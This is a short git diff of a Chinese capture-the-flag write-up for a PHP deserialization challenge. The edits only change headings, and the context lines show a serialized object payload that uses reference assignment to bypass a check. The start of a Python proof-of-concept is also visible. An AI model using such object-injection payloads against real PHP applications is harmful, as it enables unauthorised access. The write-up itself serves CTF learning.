@@ -9,7 +9,6 @@ tags:
 categories:
 - writeups
 ---
-# 打开链接，显示代码
 
 ```php
 <?php
@@ -52,7 +51,7 @@ if($_GET['pleaseget'] === '1') {
 > 考点2：uniqid() 函数 //基于以微秒计的当前时间，生成一个唯一的 ID。
 > 考点3：引用赋值
 
-# php payload:
+# php payload
 
 ```php
 class BUU{
@@ -65,7 +64,7 @@ echo serialize($b);
 # O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
 ```
 
-# poc:
+# poc
 
 ```python
 #!/usr/bin/env python
